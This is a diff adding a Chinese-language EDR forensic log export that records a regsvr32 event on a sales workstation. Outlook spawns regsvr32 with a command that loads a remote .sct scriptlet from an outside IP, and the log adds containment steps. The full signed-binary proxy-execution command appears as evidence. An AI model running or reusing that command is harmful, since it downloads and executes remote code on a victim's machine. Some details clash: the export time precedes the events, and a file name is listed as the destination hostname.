@@ -1,0 +1,23 @@
+==============================================================================
+ 奇安信 天擎 EDR  取证日志导出
+ 导出时间: 2026-06-19 01:46:46  时区: Asia/Shanghai (UTC+8)
+ 关联规则: EDR-DEFEVA-1771  regsvr32 /i 远程 scriptlet 加载
+ ATT&CK: T1218.010 Regsvr32
+==============================================================================
+
+2026-06-19 11:16:00  SALES-PC-051  EventID=1 (ProcessCreate / Auth)
+  Computer: SALES-PC-051
+  User: CORP\zhou.min
+  Image/Process: regsvr32.exe
+  CommandLine: regsvr32.exe /s /n /u /i:http://185.220.101.45/x.sct scrobj.dll
+  ParentImage: outlook.exe
+  Action: -
+  Hashes: SHA256=-
+
+2026-06-19 11:16:00  SALES-PC-051  EventID=3 (NetworkConnect)
+  SourceIp: 10.25.9.51  DestinationIp: 185.220.101.45:80
+  DestinationHostname: x.sct
+
+VERDICT: UNDER_INVESTIGATION
+KeyEvidence: regsvr32 /i 远程 .sct；outlook->regsvr32 进程链；外联 185.220.101.45
+Handling: 封禁外联地址，提取 x.sct 内容研判下一阶段载荷，排查邮件来源。
